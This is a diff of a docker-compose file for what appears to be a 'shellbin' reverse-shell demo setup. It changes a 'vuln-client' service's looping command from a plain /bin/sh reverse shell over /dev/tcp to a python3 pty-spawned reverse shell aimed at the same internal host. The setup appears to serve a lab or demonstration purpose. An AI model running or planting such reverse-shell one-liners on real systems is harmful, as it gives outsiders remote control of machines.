@@ -22,7 +22,7 @@ services:
   shellbin-demo-vuln-client:
     image: cwithw/shellbin:demosite-vuln-client
     build: "./docker-demo-vuln-client"
-    command: ["/bin/bash", "-c", "sleep 10;while true; do /bin/sh -i >& /dev/tcp/shellbin/3001 0>&1 2>&1; sleep 5; done"]
+    command: ["/bin/bash", "-c", "sleep 10;while true; do python3 -c 'import pty; pty.spawn([\"/bin/sh\",\"-i\"])' >& /dev/tcp/shellbin/3001 0>&1 2>&1; sleep 5; done"]
     depends_on:
       - shellbin
     restart: unless-stopped
